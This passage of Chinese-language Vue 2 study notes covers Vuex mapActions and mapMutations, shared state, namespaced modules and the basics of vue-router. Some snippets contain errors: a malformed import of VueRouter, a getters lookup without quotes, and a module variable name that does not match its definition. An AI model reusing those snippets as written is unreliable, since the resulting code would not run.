    // 借助mapActions生成对应方法，方法中会调用dispatch去联系actions（对象写法）
    // ...mapActions({incrementOdd: 'incrementOdd', incrementAsync: 'incrementAsync'}),
    // 借助mapActions生成对应方法，方法中会调用dispatch去联系actions（数组写法）
    ...mapActions(['incrementOdd', 'incrementAsync']),
  },
```

​	我们需要注意的一点是：如果我们在模板中制定方法不传参的话，系统会帮我们默认传一个事件对象（event），由于我们这个写法没有指定value值，再加上模板也没有声明接收参数，则会导致我们在mutations中操作的value值为事件对象(event)，sum和event相加会变成拼接字符串

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230411162121335.png" alt="image-20230411162121335" style="zoom:50%;" />

​	为了解决这个问题，我们必须在模板里就提前声明传入我们需要的value

```vue
    <button @click="incrementOdd(selectedNumber)">当前求和为奇数再加</button>
    <button @click="incrementAsync(selectedNumber)">等一等再加</button>
```

这样才恢复正常，下面操作用commit同mutations通信也是一样的

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230411162237975.png" alt="image-20230411162237975" style="zoom:50%;" />

4. **mapMutations**方法：用于帮助我们生成与`mutations`对话的方法，即：包含`$store.commit(xxx)`的函数

```vue
    <button @click="increment(selectedNumber)">+</button>
    <button @click="decrement(selectedNumber)">-</button>
```

```js
  computed: {
    // es6语法：把每一组keyvalue都展开放入这里
    // 借助mapState生成计算属性，从state中读取属性（对象写法）
    // ...mapState({sum: 'sum', school: 'school', subject: 'subject'}),
    // 借助mapState生成计算属性，从state中读取属性（数组写法）
    ...mapState(['sum', 'school', 'subject']),
    
    // 借助mapState生成计算属性，从getters中读取属性（对象写法）
    // ...mapGetters({bigSum: 'bigSum'}),
    // 借助mapState生成计算属性，从getters中读取属性（数组写法）
    ...mapGetters(['bigSum'])
  },
  methods: {
    // // 没有网络请求或其他业务逻辑的动作可以不需要经过actions，直接和mutations对话
    // 程序员亲自写的方法
    // increment() {
    //   this.$store.commit('INCREMENT', this.selectedNumber)
    // },
    // // 没有网络请求或其他业务逻辑的动作可以不需要经过actions，直接和mutations对话
    // decrement() {
    //   this.$store.commit('DECREMENT', this.selectedNumber)
    // },

    // 借助mapMutataions生成对应的方法，方法中会调用commit去联系mutations（对象写法）
    ...mapMutations({increment: 'INCREMENT', decrement: 'DECREMENT'}),
    // 借助mapMutataions生成对应的方法，方法中会调用commit去联系mutations（数组写法）
    // ...mapMutations(['INCREMENT', 'DECREMENT']),
  },
```

备注：`mapActions`与`mapMutations`使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

## 4.8 多组件共享数据

​	我们使用vuex的初衷就是将数据存在vuex中，每一个组件都可以访问到它

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230411170125354.png" alt="image-20230411170125354" style="zoom:50%;" />

​	我们在页面中新加一个组件Person，并且将数据源存放在state中

`src/store/index.js`

```js
const state = {
    sum: 0, // 当前的求和
    school: '尚硅谷',
    subject: '前端',
    personList: [
        {id:'001', name: '张三'}
    ]
}
```

Person.vue

```vue
<template>
  <div>
    <h1>人员列表</h1>
    <h3 style="color: red">Count组件求和为：{{sum}}</h3>
    <input type="text" placeholder="请输入名字" v-model="name">
    <button @click="add">添加</button>
    <ul>
        <li v-for="person in personList" :key="person.id">{{person.name}}</li>
    </ul>
  </div>
</template>

<script>
import { nanoid } from 'nanoid'
import { mapState } from 'vuex'
export default {
    name: 'Person',
    data() {
        return {
            name: ''
        }
    },
    computed: {
        // personList(){
        //     return this.$store.state.personList
        // },
        // sum(){
        //     return this.$store.state.sum
        // }
        ...mapState(['personList', 'sum'])
    },
    methods: {
        add(){
            const personObj = {id: nanoid(), name: this.name}
            this.$store.commit('ADD_PERSON', personObj)
            this.name = ''
        }
    },
}
</script>

<style>

</style>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230411170835306.png" alt="image-20230411170835306" style="zoom:50%;" />

​	这样组件间通信将会变得非常简单

## 4.9 模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确

2. 修改`store.js`为了拒绝不同模块命名冲突的问题，将不同模块的`namespaced: true`，之后在不同页面中引入`getter、actions、mutations`时，需要加上所属的模块名，才能在组件中使用

   ```javascript
   const countOptions = {
       // 开启命名空间，好让对应的组件可以使用countOption
       namespaced: true,
       actions: {...},
       mutations: {...},
       state: {
           sum: 0, // 当前的求和
           school: '尚硅谷',
           subject: '前端',
       },
       getters: {
           bigSum(state) {
               return state.sum * 10
           }
       }
   }
   const personAbout = {
       namespaced: true,
       actions: {...},
     	mutations: {...},
       state: {...},
   }
   // 创建并暴露Store
   export default new Vuex.Store({
       modules: {
           countAbout: countOptions,
           personAbout: personOptions
       }
   })
   ```

   3. 开启命名空间后，组件中读取`state`的数据

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.personList
   //方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ```

   4. 开启命名空间后，组件中读取`getters`数据：

      ```javascript
      //方式一：自己直接读取
      firstPersonName(){
         //读取对象里面的属性除了点，也可以用中括号
        return this.$store.getters[personAbout/firstPersonName]
      },
      //方式二：借助mapGetters读取：
      ...mapGetters('countAbout',['bigSum'])
      ```

   5. 开启命名空间后，组件中调用dispatch

   ```javascript
   //方式一：自己直接读取
   addPersonWang(){
       const personObj = {id: nanoid(), name: this.name}
       this.$store.dispatch('personAbout/addPersonWang', personObj)
       this.name = ''
   },
   //方式二：借助mapActions：
   // 如果要在这里触发简写方式，则必须要在模板里提前传值，则最好是我们在data中就配置好数据，前面在Count中就已经配置好了selectedNumber
    ...mapActions('countAbout', ['incrementOdd', 'incrementAsync']),
   ```

   6. 开启命名空间后，组件中调用commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   //同样的，触发简写方式需要在模板里提前传值
   ...mapMutations('countAbout', {increment: 'INCREMENT', decrement: 'DECREMENT'}),
   
   ```

   将每个组件要用到的数据模块化后，我们就可以非常轻松的建立单独的文件夹并进行维护

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230412195220192.png" alt="image-20230412195220192" style="zoom:50%;" />

简写、进行模块化都是为了更好地编码，跟纯vuex实现的业务逻辑都是一样的。具体代码已上传GitHub的vuex模块：https://github.com/chenzhengqingzzz/Vue

# 5. vue-router

## 5.1 相关理解

### 5.1.1 vue-router的理解

​	vue的一个插件库，专门来实现SPA(Single Page Web Application)应用

### 5.1.2 对SPA应用的理解

1. 单页Web应用（Single Page Web Application，SPA）
2. 整个应用只有**一个完整的页面**
3. 点击页面中的导航链接**不会刷新**页面，只会做页面的**局部更新**
4. 数据需要通过ajax请求获取

### 5.1.3 路由的理解

1. 什么是路由？

   1. 一个路由（route）就是一组映射关系（key-value），多个路由需要路由器（router）进行管理

   2. `key`是路径，`value`是`function`或`component`

2. 路由分类

   1. 前端路由：

      1. 理解：value是component，用于展示页面内容

      2. 工作过程：当浏览器的路径发生改变时，对应的组件就会显示:

         * 用户点击了页面上的路由链接（本质是a链接）

         * 导致了URL地址栏中的Hash值发生了变化

         * 前端路由监听到了Hash地址的变化

         * 前端路由把当前Hash地址对应的组件渲染到浏览器中

           ![31cee169efea10e9bf4e539663c2a62db48e5ac7](https://i0.hdslb.com/bfs/album/31cee169efea10e9bf4e539663c2a62db48e5ac7.png)

   2. 后端路由：

      1. 理解：value是function，用于处理客户端提交的请求
      2. 工作过程：服务器接收到一个请求时，根据**请求路径**找到匹配的**函数**来处理请求，返回相应数据

## 5.2 基本路由

### 5.2.1 基本使用

1. 安装`vue-router`，像上面安装vuex一样，默认安装的将会是router4，只能应用于vue3中，所以我们的命令是：`npm i vue-router@3`
2. 在main.js引入插件：`import 'VueRouter' from 'vue-router'`  应用插件：`Vue.use(VueRouter)` 这里没有vuex中的需要在index.js中提前引入的类似问题
3. 在`src/router/index.js`中编写router的配置项

```js
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由组件
import About from '../components/About'
import Home from '../components/Home'

//创建router实例对象，去管理一组一组的路由规则
const router = new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home
		}
	]
})

//暴露router
export default router

```

4. 实现切换`<router-link></router-link>`浏览器会被替换为a标签`active-class`可以设置链接激活时使用的CSS类名

```vue
<!-- 原始HTML中我们使用a标签实现页面的跳转 -->
<!-- <a class="list-group-item active" href="./about.html">About</a> -->
<!-- <a class="list-group-item" href="./home.html">Home</a> -->

<!-- vue中借助router-link标签实现路由的切换 -->
<router-link class="list-group-item" active-class="active" to="/about">About</router-link>
<router-link class="list-group-item" active-class="active" to="home">Home</router-link>
```

5. 指定展示的位置

```vue
            <!-- 指定组件的呈现位置 -->
            <router-view></router-view>
```

​	切换的时候会把路由销毁，触发销毁生命周期的函数

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230413174025835.png" alt="image-20230413174025835" style="zoom:50%;" />

### 5.2.2 几个注意点

1. 路由组件通常存放在`pages`文件夹，一般组件通常存放在`components`文件夹

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230413175819982.png" alt="image-20230413175819982" style="zoom:50%;" />

2. 通过切换，“隐藏”了路由组件，默认是被销毁掉的，需要的时候再去挂载
3. 每个组件都有自己的`$route`属性，里面存储着自己的路由信息

4. 整个应用只有一个router，可以通过组件的`$router`属性获取到

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230413180112848.png" alt="image-20230413180112848" style="zoom:50%;" />

